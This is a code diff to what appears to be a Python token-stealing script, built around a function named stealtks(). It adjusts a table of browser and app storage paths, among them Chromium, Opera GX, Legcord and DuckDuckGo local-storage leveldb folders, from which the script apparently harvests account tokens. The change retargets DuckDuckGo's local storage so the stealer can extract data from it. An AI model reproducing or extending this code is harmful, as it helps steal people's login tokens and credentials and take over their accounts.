@@ -269,7 +269,6 @@ def stealtks():
     '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
     '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
-    '0DuckDuckGo': os.path.join(local, 'Packages', 'DuckDuckGo.DesktopBrowser_ya2fgkz3nks94', 'LocalState', 'EBWebView'),
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
@@ -290,6 +289,7 @@ def stealtks():
     '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
     '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
     '2OperaGXOld': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
+    '2DuckDuckGo': os.path.join(local, 'Packages', 'DuckDuckGo.DesktopBrowser_ya2fgkz3nks94', 'LocalState', 'EBWebView', 'Default', 'Local Storage', 'leveldb'),
     '2OperaGXNew': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Default', 'Local Storage', 'leveldb'),
     '2OperaAir': os.path.join(roaming, 'Opera Software', 'Opera Air Stable', 'Default', 'Local Storage', 'leveldb'),
     '2Legcord': os.path.join(roaming, 'legcord', 'Local Storage', 'leveldb'),
@@ -407,5 +407,6 @@ def main():
         
 
 main()
+
 
 
